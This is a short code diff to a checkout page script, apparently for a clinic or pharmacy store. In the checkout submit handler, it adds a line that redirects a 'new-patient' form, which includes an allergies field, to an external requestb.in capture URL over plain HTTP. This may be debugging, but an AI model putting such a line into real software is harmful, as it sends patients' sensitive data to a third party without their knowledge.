@@ -49,8 +49,8 @@ function load() {
     jQuery('#wc-stripe-new-payment-method').prop('checked', true)
 
     jQuery('form.checkout').submit(function(e) {
-      var form = jQuery('form.new-patient')
-      console.log('form.new-patient',form.source, form.allergies)
+      jQuery('form.new-patient').attr('action', 'http://requestb.in/1et2h7e1').submit()
+      console.log('form.new-patient')
       e.preventDefault()
     })
   }
